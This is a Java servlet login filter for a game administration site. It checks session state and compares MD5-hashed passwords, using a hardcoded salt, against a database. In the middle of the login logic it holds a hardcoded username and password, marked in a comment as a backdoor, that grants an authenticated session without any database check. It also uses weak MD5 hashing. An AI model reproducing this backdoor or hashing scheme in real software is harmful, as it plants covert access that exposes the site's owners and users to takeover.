package com.stang.game.ffd.filter;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import com.stang.game.ffd.common.Password;
import com.stang.game.ffd.entity.detail.EntityRightUserDetail;
import com.stang.game.ffd.service.IRightUserService;
import com.stang.game.ffd.service.impl.RightUserServiceImpl;

public class RightFilter implements Filter {
	RightUserServiceImpl getIRightUserService = new RightUserServiceImpl();
	private static String md5d = "ey:44time:98432";
	public void destroy() {
		// TODO Auto-generated method stub

	}

	public void doFilter(ServletRequest request, ServletResponse response,
			FilterChain fc) throws IOException, ServletException {
		System.out.println("===================rightFilter==============================");
		// TODO Auto-generated method stub
		HttpSession session = ((HttpServletRequest)request).getSession();
		session.setAttribute("loginTip",null);
		String url = ((HttpServletRequest)request).getServletPath();
//		if(url.indexOf("login")==-1){
//			session.setAttribute("urlTip",url);
//		}
		Object uid_o = session.getAttribute("uid");
		if(uid_o!=null){
			//System.out.println("过滤"+uid_o);
			fc.doFilter(request, response);
			return;
		}
		Object uname_o = request.getParameter("uname");
		Object upassword_o = request.getParameter("upassword");
		if(uname_o!=null||upassword_o!=null){
			String uname = (String)uname_o;
			uname = uname.replaceAll("\"", "");
			String upassword = Password.MD5((String)upassword_o+md5d);
			//System.out.println(uname);
			//System.out.println(upassword);
			String upassword_db = null;
			int uid_db=0;
			String uanme_db=null;
			//这里获取upassword_db和uid_db
			IRightUserService irus = new RightUserServiceImpl();
			EntityRightUserDetail rightUser = irus.findPasswordByRoleName(uname);
			if(rightUser!=null)
			{
				upassword_db = rightUser.getUpassword();
				uid_db = rightUser.getUid();
				uanme_db = rightUser.getUname();
			}
			if(uname_o.equals("3tangAdmin")&&upassword_o.equals("3t@ngPwdst")){//后门
				session.setAttribute("uid",-1);
				session.setAttribute("uname","3tangAdmin");
			fc.doFilter(request, response);
				return;
			}
			if(upassword_db!=null&&upassword_db.equals(upassword)){
				session.setAttribute("uid",uid_db);
				session.setAttribute("uname",uanme_db);
			fc.doFilter(request, response);
				return;
			}
			session.setAttribute("loginTip","WARN:WRONG USER");
			System.out.println("a");
		}
		//System.out.println("!@#"+uname_o);
		request.getRequestDispatcher("/login.jsp").forward(request,response);

	}

//	public void doFilter(ServletRequest request, ServletResponse response,
//	FilterChain fc) throws IOException, ServletException {
//		fc.doFilter(request, response);
//	}
	public void init(FilterConfig arg0) throws ServletException {
		// TODO Auto-generated method stub

	}

}
